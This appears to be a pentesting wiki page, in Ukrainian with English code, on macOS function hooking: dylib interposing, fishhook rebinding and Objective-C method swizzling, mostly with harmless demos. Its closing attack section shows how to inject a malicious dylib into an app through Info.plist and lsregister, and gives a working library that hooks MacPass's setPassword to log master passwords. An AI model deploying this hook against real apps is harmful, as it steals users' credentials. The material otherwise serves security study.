# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Створіть **dylib** із секцією **`__interpose` (`__DATA___interpose`)** (або секцією, позначеною прапорцем **`S_INTERPOSING`**), що містить кортежі **вказівників на функції**, які посилаються на **оригінальні** та **замінювальні** функції.

Потім **впровадьте** dylib за допомогою **`DYLD_INSERT_LIBRARIES`** (interposing має відбутися до завантаження основного застосунку). Очевидно, [**обмеження**, що застосовуються до використання **`DYLD_INSERT_LIBRARIES`**, також застосовуються тут](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Змінну середовища **`DYLD_PRINT_INTERPOSING`** можна використовувати для налагодження interposing; вона виводитиме процес interpose.

Також зверніть увагу, що **interposing відбувається між процесом і завантаженими libraries**; воно не працює зі shared library cache.

### Dynamic Interposing

Тепер також можна динамічно виконувати interpose функції за допомогою функції **`dyld_dynamic_interpose`**. Це дає змогу **програмно** виконувати interpose функції під час **runtime**, а не лише з **початку**.

Потрібно лише вказати **кортежі** **функції, яку потрібно замінити, і функції-заміни**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Якщо у вас уже є виконання коду **всередині процесу** і потрібно перехопити **імпортовану C-функцію** без повторного запуску цільового процесу, дуже поширеним примітивом є **symbol rebinding** (популяризований **`fishhook`**).

Замість використання секції **`__interpose`** цей метод проходить метадані Mach-O (`__LINKEDIT` -> таблиця непрямих символів -> `__la_symbol_ptr` / `__nl_symbol_ptr`) і **перезаписує слот імпорту**, який використовується поточним image. Це дуже корисно для перехоплення функцій у **вже запущеному** процесі або для перехоплення функцій лише в **одному image** за допомогою **`rebind_symbols_image`**.<sup>[[2]](#references)</sup>

> [!TIP]
> Це впливає лише на виклики, які фактично проходять через **import pointer**. Якщо цільова функція викликається безпосередньо в межах того самого image, імпортованого слота для перезапису немає, тому цей метод не побачить таку точку виклику.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
У сучасних версіях macOS багато цілей rebinding більше не розташовані у доступних для запису сторінках **`__DATA`**. Rebinders зазвичай мають тимчасово зробити **`__DATA_CONST`** доступним для запису перед виправленням pointer. Крім того, на Apple Silicon / **`arm64e`** слід очікувати authenticated pointers і додаткову непряму адресацію в **`__AUTH_CONST.__auth_got`**, тому rebinder, який сканує лише класичні lazy/non-lazy symbol pointer sections, може пропустити деякі call sites.<sup>[[3]](#references)</sup>

> [!CAUTION]
> ABI **`arm64e`** використовує **Pointer Authentication (PAC)** для багатьох function pointers. Сліпий запис pointer, який раніше працював на Intel, може пошкодити call site на Apple Silicon. Якщо ви пишете власний rebinder або inline hooker, будьте готові використовувати helpers із **`<ptrauth.h>`**, наприклад **`ptrauth_sign_unauthenticated`** або **`ptrauth_auth_and_resign`**, і обов’язково тестуйте саме на цілях **`arm64e`**.

Докладніше про **`__AUTH`**, **`__AUTH_CONST`** і **`__auth_got`** дивіться на [цій сторінці](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

В ObjectiveC метод викликається так: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Потрібні **object**, **method** і **params**. Коли викликається метод, надсилається **msg** за допомогою function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object — це **`someObject`**, method — **`@selector(method1p1:p2:)`**, а аргументи — **value1**, **value2**.

З огляду на структури object можна дістатися до **array of methods**, де **names** і **pointers** на код методу є **located**.

> [!CAUTION]
> Зверніть увагу, що оскільки methods і classes доступаються на основі їхніх names, ця інформація зберігається у binary, тому її можна отримати за допомогою `otool -ov </path/bin>` або [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Доступ до raw methods

Можна отримати таку інформацію про methods, як name, number of params або address, як у наведеному нижче прикладі:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Функція **`method_exchangeImplementations`** дає змогу **змінити** **адресу** **реалізації** **однієї функції на адресу іншої**.

> [!CAUTION]
> Отже, коли викликається функція, **виконується інша**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> У цьому випадку, якщо **код реалізації легітимного** методу **перевіряє** **ім'я** **методу**, він може **виявити** цей swizzling і запобігти його виконанню.
>
> Наведена нижче техніка не має цього обмеження.

### Method Swizzling with method_setImplementation

Попередній формат є дивним, оскільки ви змінюєте реалізацію 2 методів: один — на реалізацію іншого. За допомогою функції **`method_setImplementation`** ви можете **змінити** **реалізацію** **методу на реалізацію іншого**.

Просто пам'ятайте: якщо ви збираєтеся викликати реалізацію оригінального методу з нової реалізації, **збережіть адресу реалізації оригінального методу** до її перезапису, оскільки згодом знайти цю адресу буде набагато складніше.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Методологія Hooking Attack

На цій сторінці обговорювалися різні способи hook функцій. Однак вони передбачали **запуск коду всередині процесу, який потрібно атакувати**.

Для цього найпростіше скористатися технікою ін’єкції [Dyld через змінні середовища або hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Однак, гадаю, це також можна зробити через [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Однак обидва варіанти **обмежені** **незахищеними** бінарними файлами/процесами. Ознайомтеся з кожною технікою, щоб дізнатися більше про обмеження.

Однак атака на hooking функцій є дуже специфічною: зловмисник робитиме це, щоб **викрасти конфіденційну інформацію зсередини процесу** (інакше можна було б просто виконати атаку через ін’єкцію процесу). Ця конфіденційна інформація може міститися в Apps, завантажених користувачем, наприклад у MacPass.

Отже, вектором атаки зловмисника буде або пошук вразливості, або видалення підпису застосунку, ін’єкція змінної середовища **`DYLD_INSERT_LIBRARIES`** через Info.plist застосунку з додаванням чогось на кшталт:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
а потім **повторно зареєструвати** застосунок:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Додайте до цієї library hooking code для exfiltrate інформації: паролів, повідомлень...

> [!CAUTION]
> Зверніть увагу, що в новіших версіях macOS, якщо ви **видалите підпис** бінарного файлу програми, а його було виконано раніше, macOS **більше не виконуватиме програму**.

#### Приклад library
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Посилання

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: A library that simplifies the process of dynamically rebinding symbols in Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
